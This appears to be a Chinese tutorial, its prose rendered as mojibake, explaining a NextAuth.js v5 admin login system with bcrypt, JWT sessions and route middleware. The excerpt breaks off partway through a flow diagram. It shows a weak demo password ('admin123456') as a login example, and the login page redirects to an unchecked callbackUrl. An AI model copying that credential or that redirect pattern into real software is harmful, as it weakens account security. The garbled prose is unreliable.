# NextAuth.js v5 ç™»å½•ç³»ç»Ÿå®Œæ•´è§£æ

> TFT Blog é¡¹ç›®ç®¡ç†å‘˜è®¤è¯ç³»ç»Ÿå®ç°æŒ‡å—
>
> æœ¬æ–‡æ¡£è¯¦ç»†è®²è§£åŸºäº NextAuth.js v5 çš„ç™»å½•ç³»ç»Ÿå®ç°åŸç†å’Œå®Œæ•´æµç¨‹

---

## ğŸ“š ç›®å½•

- [ä¸€ã€æ ¸å¿ƒæ¦‚å¿µ](#ä¸€æ ¸å¿ƒæ¦‚å¿µ)
- [äºŒã€æ–‡ä»¶è¯¦è§£](#äºŒæ–‡ä»¶è¯¦è§£)
- [ä¸‰ã€å®Œæ•´ç™»å½•æµç¨‹](#ä¸‰å®Œæ•´ç™»å½•æµç¨‹)
- [å››ã€å®‰å…¨æœºåˆ¶](#å››å®‰å…¨æœºåˆ¶)
- [äº”ã€å¸¸è§é—®é¢˜](#äº”å¸¸è§é—®é¢˜)
- [å…­ã€å®éªŒç»ƒä¹ ](#å…­å®éªŒç»ƒä¹ )

---

## ä¸€ã€æ ¸å¿ƒæ¦‚å¿µ

### 1.1 è®¤è¯æµç¨‹å›¾

```
ç”¨æˆ·è¾“å…¥è´¦å·å¯†ç 
    â†“
å‰ç«¯è°ƒç”¨ signIn()
    â†“
POST /api/auth/callback/credentials
    â†“
NextAuth è°ƒç”¨ authorize() éªŒè¯
    â†“
æŸ¥è¯¢æ•°æ®åº“ï¼ŒéªŒè¯å¯†ç 
    â†“
ç”Ÿæˆ JWT Token
    â†“
è®¾ç½® HttpOnly Cookie
    â†“
è¿”å›æˆåŠŸ/å¤±è´¥
    â†“
å‰ç«¯é‡å®šå‘åˆ°ç›®æ ‡é¡µé¢
```

### 1.2 æŠ€æœ¯æ ˆ

- **NextAuth.js v5** (Auth.js) - è®¤è¯æ¡†æ¶
- **JWT** - Token æ ¼å¼
- **bcrypt** - å¯†ç å“ˆå¸Œç®—æ³•
- **MongoDB + Mongoose** - ç”¨æˆ·æ•°æ®å­˜å‚¨
- **HttpOnly Cookie** - Token å­˜å‚¨æ–¹å¼

### 1.3 å…³é”®ç»„ä»¶

| ç»„ä»¶ | ä½œç”¨ | ä½ç½® |
|------|------|------|
| NextAuth é…ç½® | å®šä¹‰è®¤è¯ç­–ç•¥å’Œå›è°ƒ | `auth.ts` |
| API è·¯ç”± | å¤„ç†æ‰€æœ‰è®¤è¯è¯·æ±‚ | `app/api/auth/[...nextauth]/route.ts` |
| ä¸­é—´ä»¶ | ä¿æŠ¤è·¯ç”±ï¼Œæ£€æŸ¥æƒé™ | `middleware.ts` |
| Admin æ¨¡å‹ | å­˜å‚¨ç”¨æˆ·æ•°æ® | `models/Admin.ts` |
| ç™»å½•é¡µé¢ | ç”¨æˆ·ç•Œé¢ | `app/login/page.tsx` |

---

## äºŒã€æ–‡ä»¶è¯¦è§£

### 2.1 `auth.ts` - NextAuth æ ¸å¿ƒé…ç½®

**ä½œç”¨**: NextAuth.js çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œå®šä¹‰è®¤è¯æä¾›è€…ã€Session ç­–ç•¥ã€å›è°ƒå‡½æ•°ç­‰ã€‚

```typescript
import NextAuth, { NextAuthConfig } from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import dbConnect from '@/lib/mongodb';
import Admin from '@/models/Admin';

export const authConfig: NextAuthConfig = {
  // ============================================================
  // 1ï¸âƒ£ é…ç½®è®¤è¯æä¾›è€…ï¼ˆProvidersï¼‰
  // ============================================================
  providers: [
    CredentialsProvider({
      // æä¾›è€…åç§°
      name: 'Credentials',

      // å®šä¹‰ç™»å½•è¡¨å•å­—æ®µ
      credentials: {
        email: {
          label: 'é‚®ç®±',
          type: 'email',
          placeholder: 'admin@tftblog.com',
        },
        password: {
          label: 'å¯†ç ',
          type: 'password',
        },
      },

      // ============================================================
      // 2ï¸âƒ£ æ ¸å¿ƒè®¤è¯é€»è¾‘ - authorize å‡½æ•°
      // ============================================================
      // å½“ç”¨æˆ·æäº¤ç™»å½•è¡¨å•æ—¶ï¼ŒNextAuth ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°
      async authorize(credentials) {
        // æ­¥éª¤ 1: éªŒè¯è¾“å…¥
        if (!credentials?.email || !credentials?.password) {
          throw new Error('è¯·è¾“å…¥é‚®ç®±å’Œå¯†ç ');
        }

        // æ­¥éª¤ 2: è¿æ¥æ•°æ®åº“
        await dbConnect();

        // æ­¥éª¤ 3: æŸ¥æ‰¾ç”¨æˆ·
        const admin = await Admin.findOne({
          email: (credentials.email as string).toLowerCase(),
        });

        if (!admin) {
          // å®‰å…¨æç¤ºï¼šä¸æš´éœ²å…·ä½“æ˜¯é‚®ç®±è¿˜æ˜¯å¯†ç é”™è¯¯
          throw new Error('é‚®ç®±æˆ–å¯†ç é”™è¯¯');
        }

        // æ­¥éª¤ 4: éªŒè¯å¯†ç ï¼ˆä½¿ç”¨ bcryptï¼‰
        const isValid = await admin.comparePassword(
          credentials.password as string
        );

        if (!isValid) {
          throw new Error('é‚®ç®±æˆ–å¯†ç é”™è¯¯');
        }

        // âœ… æ­¥éª¤ 5: è¿”å›ç”¨æˆ·ä¿¡æ¯ï¼ˆä¸å«å¯†ç ï¼‰
        // è¿™äº›ä¿¡æ¯ä¼šè¢«ä¼ é€’åˆ° jwt() å›è°ƒ
        return {
          id: admin._id.toString(),
          email: admin.email,
          name: admin.name,
          role: admin.role,
        };
      },
    }),
  ],

  // ============================================================
  // 3ï¸âƒ£ Session é…ç½®
  // ============================================================
  session: {
    strategy: 'jwt',              // ä½¿ç”¨ JWT è€Œéæ•°æ®åº“ session
    maxAge: 7 * 24 * 60 * 60,     // 7 å¤©æœ‰æ•ˆæœŸï¼ˆå•ä½ï¼šç§’ï¼‰
  },

  // ============================================================
  // 4ï¸âƒ£ è‡ªå®šä¹‰é¡µé¢è·¯å¾„
  // ============================================================
  pages: {
    signIn: '/login',       // ç™»å½•é¡µé¢è·¯å¾„
    error: '/login',        // é”™è¯¯é¡µé¢ï¼ˆç™»å½•å¤±è´¥æ—¶æ˜¾ç¤ºï¼‰
  },

  // ============================================================
  // 5ï¸âƒ£ å›è°ƒå‡½æ•°ï¼ˆCallbacksï¼‰
  // ============================================================
  callbacks: {
    // ------------------------------------------------------------
    // JWT å›è°ƒï¼šåœ¨åˆ›å»º/æ›´æ–° token æ—¶è°ƒç”¨
    // ------------------------------------------------------------
    // æ—¶æœºï¼š
    // - ç”¨æˆ·é¦–æ¬¡ç™»å½•
    // - æ¯æ¬¡è¯·æ±‚æ—¶åˆ·æ–° token
    async jwt({ token, user }) {
      if (user) {
        // é¦–æ¬¡ç™»å½•æ—¶ï¼Œå°† authorize() è¿”å›çš„ user ä¿¡æ¯å­˜å…¥ token
        token.id = user.id;
        token.email = user.email;
        token.name = user.name;
        token.role = (user as any).role;
      }
      // è¿”å›çš„ token ä¼šè¢«åŠ å¯†å¹¶å­˜å‚¨åœ¨ Cookie ä¸­
      return token;
    },

    // ------------------------------------------------------------
    // Session å›è°ƒï¼šåœ¨è·å– session æ—¶è°ƒç”¨
    // ------------------------------------------------------------
    // æ—¶æœºï¼š
    // - è°ƒç”¨ auth() æˆ– getSession() æ—¶
    // - æœåŠ¡ç«¯/å®¢æˆ·ç«¯è·å– session æ•°æ®æ—¶
    async session({ session, token }) {
      // å°† token ä¸­çš„ä¿¡æ¯ä¼ é€’åˆ° session
      // è¿™æ ·å‰ç«¯å°±å¯ä»¥è®¿é—®è¿™äº›æ•°æ®
      if (token && session.user) {
        (session.user as AdminUser).id = token.id as string;
        (session.user as AdminUser).email = token.email as string;
        (session.user as AdminUser).name = token.name as string;
        (session.user as AdminUser).role = token.role as 'admin';
      }
      return session;
    },
  },

  // ============================================================
  // 6ï¸âƒ£ å®‰å…¨é…ç½®
  // ============================================================
  secret: process.env.NEXTAUTH_SECRET,      // JWT ç­¾åå¯†é’¥
  debug: process.env.NODE_ENV === 'development', // å¼€å‘æ¨¡å¼å¯ç”¨è°ƒè¯•æ—¥å¿—
};

// ============================================================
// 7ï¸âƒ£ å¯¼å‡ºè®¤è¯å‡½æ•°
// ============================================================
export const { handlers, signIn, signOut, auth } = NextAuth(authConfig);
```

**å…³é”®ç‚¹**ï¼š

- **`authorize()`**: æœ€æ ¸å¿ƒçš„å‡½æ•°ï¼Œè´Ÿè´£éªŒè¯ç”¨æˆ·èº«ä»½
- **`jwt()` å›è°ƒ**: æ§åˆ¶ JWT Token åŒ…å«å“ªäº›ä¿¡æ¯
- **`session()` å›è°ƒ**: æ§åˆ¶å‰ç«¯å¯ä»¥è®¿é—®å“ªäº›æ•°æ®
- **`strategy: 'jwt'`**: ä½¿ç”¨ JWT è€Œéæ•°æ®åº“ sessionï¼Œæ€§èƒ½æ›´å¥½

---

### 2.2 `middleware.ts` - è·¯ç”±ä¿æŠ¤

**ä½œç”¨**: åœ¨æ¯ä¸ªè¯·æ±‚åˆ°è¾¾é¡µé¢å‰æ‹¦æˆªï¼Œæ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•ï¼Œä¿æŠ¤éœ€è¦è®¤è¯çš„è·¯ç”±ã€‚

```typescript
import { auth } from '@/auth';
import { NextResponse } from 'next/server';

/**
 * è·¯ç”±ä¿æŠ¤ä¸­é—´ä»¶
 *
 * å·¥ä½œåŸç†ï¼š
 * 1. Next.js åœ¨æ¯ä¸ªåŒ¹é…çš„è¯·æ±‚å‰è°ƒç”¨æ­¤å‡½æ•°
 * 2. auth() åŒ…è£…å™¨è‡ªåŠ¨è¯»å–å¹¶éªŒè¯ JWT Cookie
 * 3. å¦‚æœ Token æœ‰æ•ˆï¼Œæ³¨å…¥ req.auth å¯¹è±¡
 * 4. æ ¹æ®ç™»å½•çŠ¶æ€å†³å®šæ”¾è¡Œæˆ–é‡å®šå‘
 */
export default auth((req) => {
  const { pathname } = req.nextUrl;

  // æ£€æŸ¥ç”¨æˆ·æ˜¯å¦å·²ç™»å½•
  // req.auth ç”± NextAuth è‡ªåŠ¨æ³¨å…¥ï¼ŒåŒ…å« session ä¿¡æ¯
  const isLoggedIn = !!req.auth;

  // ------------------------------------------------------------
  // å®šä¹‰éœ€è¦ä¿æŠ¤çš„è·¯å¾„
  // ------------------------------------------------------------
  const protectedPaths = ['/dashboard'];
  const isProtectedPath = protectedPaths.some((path) =>
    pathname.startsWith(path)
  );

  // ------------------------------------------------------------
  // åœºæ™¯ 1: æœªç™»å½•è®¿é—®å—ä¿æŠ¤è·¯ç”±
  // ------------------------------------------------------------
  if (isProtectedPath && !isLoggedIn) {
    // æ„å»ºç™»å½•é¡µé¢ URL
    const loginUrl = new URL('/login', req.url);

    // ä¿å­˜ç”¨æˆ·åŸæœ¬æƒ³è®¿é—®çš„é¡µé¢
    // ç™»å½•æˆåŠŸåå¯ä»¥é‡å®šå‘å›å»
    loginUrl.searchParams.set('callbackUrl', pathname);

    // é‡å®šå‘åˆ°ç™»å½•é¡µ
    return NextResponse.redirect(loginUrl);
  }

  // ------------------------------------------------------------
  // åœºæ™¯ 2: å·²ç™»å½•è®¿é—®ç™»å½•é¡µ
  // ------------------------------------------------------------
  if (pathname === '/login' && isLoggedIn) {
    // é‡å®šå‘åˆ°æ§åˆ¶å°ï¼ˆé¿å…é‡å¤ç™»å½•ï¼‰
    return NextResponse.redirect(new URL('/dashboard', req.url));
  }

  // ------------------------------------------------------------
  // åœºæ™¯ 3: å…¶ä»–æƒ…å†µ
  // ------------------------------------------------------------
  // æ”¾è¡Œï¼Œç»§ç»­å¤„ç†è¯·æ±‚
  return NextResponse.next();
});

// ============================================================
// é…ç½®ä¸­é—´ä»¶åŒ¹é…è§„åˆ™
// ============================================================
// åªå¯¹ä»¥ä¸‹è·¯å¾„ç”Ÿæ•ˆï¼Œå…¶ä»–è·¯å¾„ä¸ä¼šè§¦å‘ä¸­é—´ä»¶
export const config = {
  matcher: [
    '/dashboard/:path*',      // æ§åˆ¶å°æ‰€æœ‰å­è·¯ç”±
    '/login',                 // ç™»å½•é¡µé¢
    '/api/dashboard/:path*',  // æ§åˆ¶å° API è·¯ç”±
  ],
};
```

**æ‰§è¡Œæµç¨‹**ï¼š

```
1. ç”¨æˆ·è¯·æ±‚ /dashboard
   â†“
2. Next.js è°ƒç”¨ middleware.ts
   â†“
3. auth() åŒ…è£…å™¨è¯»å– Cookie: next-auth.session-token
   â†“
4. è§£å¯†å¹¶éªŒè¯ JWT
   â†“
5. æœ‰æ•ˆ â†’ req.auth = { user: {...} }
   æ— æ•ˆ â†’ req.auth = null
   â†“
6. æ£€æŸ¥ isLoggedIn = !!req.auth
   â†“
7. æœªç™»å½• â†’ é‡å®šå‘åˆ° /login?callbackUrl=/dashboard
   å·²ç™»å½• â†’ NextResponse.next() ç»§ç»­æ¸²æŸ“é¡µé¢
```

---

### 2.3 `models/Admin.ts` - ç®¡ç†å‘˜æ•°æ®æ¨¡å‹

**ä½œç”¨**: å®šä¹‰ç®¡ç†å‘˜æ•°æ®ç»“æ„ï¼Œå®ç°å¯†ç å“ˆå¸Œå’ŒéªŒè¯åŠŸèƒ½ã€‚

```typescript
import mongoose from 'mongoose';
import bcrypt from 'bcryptjs';

/**
 * ç®¡ç†å‘˜æ¥å£å®šä¹‰
 */
export interface IAdmin {
  email: string;
  password: string;
  name: string;
  role: 'admin';
  createdAt: Date;
  updatedAt: Date;
}

/**
 * Mongoose Schema å®šä¹‰
 */
const AdminSchema = new mongoose.Schema<IAdmin>(
  {
    email: {
      type: String,
      required: true,
      unique: true,        // å”¯ä¸€ç´¢å¼•
      lowercase: true,     // è‡ªåŠ¨è½¬å°å†™
      trim: true,          // å»é™¤ç©ºæ ¼
      index: true,         // åˆ›å»ºç´¢å¼•æé«˜æŸ¥è¯¢é€Ÿåº¦
    },
    password: {
      type: String,
      required: true,
      minlength: 6,        // æœ€å°‘ 6 ä¸ªå­—ç¬¦
    },
    name: {
      type: String,
      required: true,
      default: 'Admin',
    },
    role: {
      type: String,
      default: 'admin',
      enum: ['admin'],     // åªå…è®¸ 'admin' å€¼
    },
  },
  {
    timestamps: true,      // è‡ªåŠ¨æ·»åŠ  createdAt å’Œ updatedAt
  }
);

// ============================================================
// Mongoose ä¸­é—´ä»¶ï¼šä¿å­˜å‰è‡ªåŠ¨å“ˆå¸Œå¯†ç 
// ============================================================
/**
 * pre('save') ä¸­é—´ä»¶
 * åœ¨æ–‡æ¡£ä¿å­˜åˆ°æ•°æ®åº“å‰æ‰§è¡Œ
 *
 * ä½œç”¨ï¼šè‡ªåŠ¨å°†æ˜æ–‡å¯†ç è½¬æ¢ä¸ºå“ˆå¸Œå€¼
 */
AdminSchema.pre('save', async function (next) {
  // ä»…åœ¨å¯†ç è¢«ä¿®æ”¹æ—¶æ‰é‡æ–°å“ˆå¸Œ
  // é¿å…æ¯æ¬¡ä¿å­˜éƒ½é‡æ–°å“ˆå¸Œï¼ˆæ¯”å¦‚æ›´æ–° name å­—æ®µï¼‰
  if (!this.isModified('password')) return next();

  // ä½¿ç”¨ bcrypt å“ˆå¸Œå¯†ç 
  // å‚æ•°è¯´æ˜ï¼š
  // - this.password: æ˜æ–‡å¯†ç 
  // - 12: salt roundsï¼ˆè®¡ç®—å¤æ‚åº¦ï¼‰ï¼Œå€¼è¶Šå¤§è¶Šå®‰å…¨ä½†è¶Šæ…¢
  this.password = await bcrypt.hash(this.password, 12);

  next(); // ç»§ç»­ä¿å­˜æµç¨‹
});

// ============================================================
// å®ä¾‹æ–¹æ³•ï¼šéªŒè¯å¯†ç 
// ============================================================
/**
 * æ¯”å¯¹ç”¨æˆ·è¾“å…¥çš„å¯†ç å’Œæ•°æ®åº“ä¸­çš„å“ˆå¸Œå€¼
 *
 * @param candidatePassword - ç”¨æˆ·è¾“å…¥çš„æ˜æ–‡å¯†ç 
 * @returns Promise<boolean> - å¯†ç æ˜¯å¦æ­£ç¡®
 */
AdminSchema.methods.comparePassword = async function (
  candidatePassword: string
): Promise<boolean> {
  // bcrypt.compare() ä¼šï¼š
  // 1. ä»å“ˆå¸Œä¸­æå– salt
  // 2. ä½¿ç”¨ç›¸åŒçš„ salt å“ˆå¸Œç”¨æˆ·è¾“å…¥
  // 3. æ¯”å¯¹ä¸¤ä¸ªå“ˆå¸Œå€¼æ˜¯å¦ç›¸åŒ
  return await bcrypt.compare(candidatePassword, this.password);
};

// ============================================================
// å®‰å…¨å¯¼å‡ºæ¨¡å‹ï¼ˆé¿å…çƒ­é‡è½½æ—¶é‡å¤æ³¨å†Œï¼‰
// ============================================================
let Admin;
try {
  // å°è¯•è·å–å·²å­˜åœ¨çš„æ¨¡å‹
  Admin = mongoose.model<IAdmin>('Admin');
} catch {
  // å¦‚æœæ¨¡å‹ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–°æ¨¡å‹
  Admin = mongoose.model<IAdmin>('Admin', AdminSchema);
}

export default Admin;
```

**bcrypt åŸç†**ï¼š

```
åŸå§‹å¯†ç : "admin123456"
       â†“ (bcrypt.hash)
åŠ ç›å€¼: "$2a$12$randomsalt..."
       â†“ (å¤šè½®å“ˆå¸Œ)
æœ€ç»ˆå“ˆå¸Œ: "$2a$12$randomsalt$hashedpassword..."
          â””â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
          ç®—æ³•ç‰ˆæœ¬   ç›å€¼       å®é™…å“ˆå¸Œ

éªŒè¯æ—¶ï¼š
ç”¨æˆ·è¾“å…¥ "admin123456"
       â†“
bcrypt.compare() æå–ç›å€¼
       â†“
ä½¿ç”¨ç›¸åŒç›å€¼é‡æ–°å“ˆå¸Œ
       â†“
æ¯”å¯¹ä¸¤ä¸ªå“ˆå¸Œ â†’ true/false
```

**ä¸ºä»€ä¹ˆå®‰å…¨ï¼Ÿ**

1. **ç›å€¼ï¼ˆSaltï¼‰**: æ¯ä¸ªå¯†ç çš„å“ˆå¸Œéƒ½ä¸åŒï¼Œå³ä½¿å¯†ç ç›¸åŒ
2. **æ…¢å“ˆå¸Œ**: Salt rounds = 12 æ„å‘³ç€è®¡ç®— 2^12 = 4096 æ¬¡ï¼Œæš´åŠ›ç ´è§£æˆæœ¬æé«˜
3. **å•å‘åŠ å¯†**: æ— æ³•ä»å“ˆå¸Œåæ¨åŸå¯†ç 

---

### 2.4 `app/login/page.tsx` - ç™»å½•é¡µé¢

**ä½œç”¨**: æä¾›ç”¨æˆ·ç•Œé¢ï¼Œå¤„ç†ç™»å½•è¡¨å•æäº¤ã€‚

```typescript
'use client'; // æ ‡è®°ä¸ºå®¢æˆ·ç«¯ç»„ä»¶ï¼ˆéœ€è¦ä½¿ç”¨ React hooksï¼‰

import { useState, FormEvent } from 'react';
import { signIn } from 'next-auth/react';
import { useRouter, useSearchParams } from 'next/navigation';
import Link from 'next/link';

export default function LoginPage() {
  // Next.js è·¯ç”±é’©å­
  const router = useRouter();
  const searchParams = useSearchParams();

  // è·å– URL ä¸­çš„ callbackUrl å‚æ•°
  // ä¾‹å¦‚ï¼š/login?callbackUrl=/dashboard
  const callbackUrl = searchParams.get('callbackUrl') || '/dashboard';

  // è¡¨å•çŠ¶æ€
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  // ============================================================
  // è¡¨å•æäº¤å¤„ç†å‡½æ•°
  // ============================================================
  const handleSubmit = async (e: FormEvent) => {
    e.preventDefault(); // é˜»æ­¢é»˜è®¤æäº¤è¡Œä¸º
    setError('');       // æ¸…é™¤ä¹‹å‰çš„é”™è¯¯
    setLoading(true);   // æ˜¾ç¤ºåŠ è½½çŠ¶æ€

    try {
      // ------------------------------------------------------------
      // è°ƒç”¨ NextAuth çš„ signIn å‡½æ•°
      // ------------------------------------------------------------
      const result = await signIn('credentials', {
        email,
        password,
        redirect: false,  // ä¸è‡ªåŠ¨é‡å®šå‘ï¼Œæ‰‹åŠ¨æ§åˆ¶
      });

      // ------------------------------------------------------------
      // å¤„ç†ç™»å½•ç»“æœ
      // ------------------------------------------------------------
      if (result?.error) {
        // âŒ ç™»å½•å¤±è´¥ï¼šæ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯
        setError(result.error);
      } else if (result?.ok) {
        // âœ… ç™»å½•æˆåŠŸï¼šé‡å®šå‘åˆ°ç›®æ ‡é¡µé¢
        router.push(callbackUrl);
        router.refresh(); // åˆ·æ–°æœåŠ¡ç«¯ç»„ä»¶ï¼ˆæ›´æ–° Navbarï¼‰
        return; // ä¸è®¾ç½® loading = falseï¼Œä¿æŒåŠ è½½çŠ¶æ€
      } else {
        // å…¶ä»–æƒ…å†µï¼ˆç†è®ºä¸Šä¸ä¼šå‡ºç°ï¼‰
        setError('ç™»å½•å¤±è´¥ï¼Œè¯·é‡è¯•');
      }
    } catch (err) {
      console.error('ç™»å½•é”™è¯¯:', err);
      setError('ç™»å½•å¤±è´¥ï¼Œè¯·é‡è¯•');
    } finally {
      setLoading(false); // æ¢å¤æŒ‰é’®çŠ¶æ€
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-50 dark:bg-gray-900 px-4">
      <div className="max-w-md w-full space-y-8">
        {/* Logo å’Œæ ‡é¢˜ */}
        <div className="text-center">
          <Link href="/" className="text-3xl font-bold text-gray-900 dark:text-white">
            TFT Blog
          </Link>
          <h2 className="mt-6 text-2xl font-semibold text-gray-700 dark:text-gray-300">
            ç®¡ç†å‘˜ç™»å½•
          </h2>
        </div>

        {/* ç™»å½•è¡¨å• */}
        <form onSubmit={handleSubmit} className="mt-8 space-y-6">
          <div className="rounded-md shadow-sm space-y-4">
            {/* é‚®ç®±è¾“å…¥ */}
            <input
              id="email"
              name="email"
              type="email"
              required
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="appearance-none relative block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="é‚®ç®±åœ°å€"
            />

            {/* å¯†ç è¾“å…¥ */}
            <input
              id="password"
              name="password"
              type="password"
              required
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="appearance-none relative block w-full px-3 py-2 border border-gray-300 dark:border-gray-700 rounded-lg bg-white dark:bg-gray-800 text-gray-900 dark:text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="å¯†ç "
            />
          </div>

          {/* é”™è¯¯æç¤º */}
          {error && (
            <div className="rounded-lg bg-red-50 dark:bg-red-900/20 p-4">
              <p className="text-sm text-red-800 dark:text-red-200">{error}</p>
            </div>
          )}

          {/* æäº¤æŒ‰é’® */}
          <button
            type="submit"
            disabled={loading}
            className="w-full py-2 px-4 border border-transparent rounded-lg text-white bg-blue-600 hover:bg-blue-700 focus:outline-none disabled:opacity-50 transition-colors"
          >
            {loading ? 'ç™»å½•ä¸­...' : 'ç™»å½•'}
          </button>

          {/* è¿”å›é¦–é¡µé“¾æ¥ */}
          <div className="text-center">
            <Link href="/" className="text-sm text-blue-600 dark:text-blue-400 hover:text-blue-800">
              è¿”å›é¦–é¡µ
            </Link>
          </div>
        </form>
      </div>
    </div>
  );
}
```

**å…³é”® API**ï¼š

- **`signIn('credentials', { ... })`**: è§¦å‘ Credentials Provider ç™»å½•
- **`redirect: false`**: é˜»æ­¢è‡ªåŠ¨é‡å®šå‘ï¼Œæ”¹ä¸ºæ‰‹åŠ¨æ§åˆ¶
- **`result.ok`**: å¸ƒå°”å€¼ï¼Œè¡¨ç¤ºç™»å½•æ˜¯å¦æˆåŠŸ
- **`result.error`**: å­—ç¬¦ä¸²ï¼ŒåŒ…å«é”™è¯¯æ¶ˆæ¯ï¼ˆæ¥è‡ª authorize() æŠ›å‡ºçš„ Errorï¼‰

---

### 2.5 `app/components/Navbar.tsx` - å¯¼èˆªæ 

**ä½œç”¨**: æ˜¾ç¤ºå¯¼èˆªé“¾æ¥ï¼Œæ ¹æ®ç™»å½•çŠ¶æ€æ˜¾ç¤ºä¸åŒå†…å®¹ã€‚

```typescript
import Link from 'next/link';
import { auth, signOut } from '@/auth';

/**
 * å…¨å±€å¯¼èˆªæ 
 *
 * å…³é”®ç‰¹æ€§ï¼š
 * 1. æœåŠ¡ç«¯ç»„ä»¶ï¼ˆasync functionï¼‰
 * 2. ç›´æ¥è°ƒç”¨ auth() è·å– sessionï¼Œæ— éœ€å®¢æˆ·ç«¯è¯·æ±‚
 * 3. ä½¿ç”¨ Server Action å®ç°é€€å‡ºåŠŸèƒ½
 */
export default async function Navbar() {
  // ------------------------------------------------------------
  // ğŸ” æœåŠ¡ç«¯è·å– session
  // ------------------------------------------------------------
  // auth() ä¼šï¼š
  // 1. è¯»å–è¯·æ±‚çš„ Cookie
  // 2. è§£å¯†å¹¶éªŒè¯ JWT
  // 3. è¿”å› session å¯¹è±¡ï¼ˆæˆ– nullï¼‰
  const session = await auth();

  return (
    <nav className="bg-white dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex justify-between items-center h-16">
          {/* å·¦ä¾§ï¼šLogo */}
          <div className="flex items-center">
            <Link href="/" className="text-xl font-bold text-gray-900 dark:text-white">
              TFT Blog
            </Link>
          </div>

          {/* å³ä¾§ï¼šå¯¼èˆªé“¾æ¥ */}
          <div className="flex items-center space-x-6">
            <Link href="/" className="text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
              é¦–é¡µ
            </Link>
            <Link href="/guides" className="text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
              æ”»ç•¥
            </Link>
            <Link href="/about" className="text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
              å…³äº
            </Link>

            {/* ------------------------------------------------------------
                å·²ç™»å½•æ—¶æ˜¾ç¤ºçš„å†…å®¹
                ------------------------------------------------------------ */}
            {session?.user ? (
              <>
                {/* æ§åˆ¶å°é“¾æ¥ */}
                <Link href="/dashboard" className="text-blue-600 dark:text-blue-400 hover:text-blue-800 font-medium transition-colors">
                  æ§åˆ¶å°
                </Link>

                {/* ç”¨æˆ·é‚®ç®± */}
                <span className="text-sm text-gray-600 dark:text-gray-400">
                  {session.user.email}
                </span>

                {/* ------------------------------------------------------------
                    é€€å‡ºæŒ‰é’®ï¼ˆServer Actionï¼‰
                    ------------------------------------------------------------ */}
                <form
                  action={async () => {
                    'use server'; // æ ‡è®°ä¸º Server Action
                    await signOut({ redirectTo: '/' });
                  }}
                >
                  <button
                    type="submit"
                    className="px-4 py-2 text-sm font-medium text-white bg-red-600 rounded-lg hover:bg-red-700 transition-colors"
                  >
                    é€€å‡º
                  </button>
                </form>
              </>
            ) : null}
          </div>
        </div>
      </div>
    </nav>
  );
}
```

**Server Action ä¼˜åŠ¿**ï¼š

```typescript
// âŒ ä¼ ç»Ÿæ–¹å¼ï¼ˆéœ€è¦å®¢æˆ·ç«¯ç»„ä»¶ï¼‰
'use client';
import { signOut } from 'next-auth/react';

<button onClick={() => signOut()}>é€€å‡º</button>

// âœ… Server Action æ–¹å¼ï¼ˆæœåŠ¡ç«¯ç»„ä»¶ï¼‰
<form action={async () => {
  'use server';
  await signOut({ redirectTo: '/' });
}}>
  <button type="submit">é€€å‡º</button>
</form>
```

**ä¼˜ç‚¹**ï¼š
- æ— éœ€å®¢æˆ·ç«¯ JavaScript
- æ›´å®‰å…¨ï¼ˆåœ¨æœåŠ¡ç«¯æ‰§è¡Œï¼‰
- SEO å‹å¥½
- æ¸è¿›å¢å¼ºï¼ˆJavaScript ç¦ç”¨æ—¶ä»å¯ç”¨ï¼‰

---

## ä¸‰ã€å®Œæ•´ç™»å½•æµç¨‹

### 3.1 ç™»å½•æµç¨‹ï¼ˆStep by Stepï¼‰

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. ç”¨æˆ·è®¿é—® /login                                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â†“
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. è¾“å…¥è´¦å·å¯†ç                                              â”‚
â”‚    - é‚®ç®±: admin@tftblog.com                                â”‚
â”‚    - å¯†ç : admin123456                                      â”‚
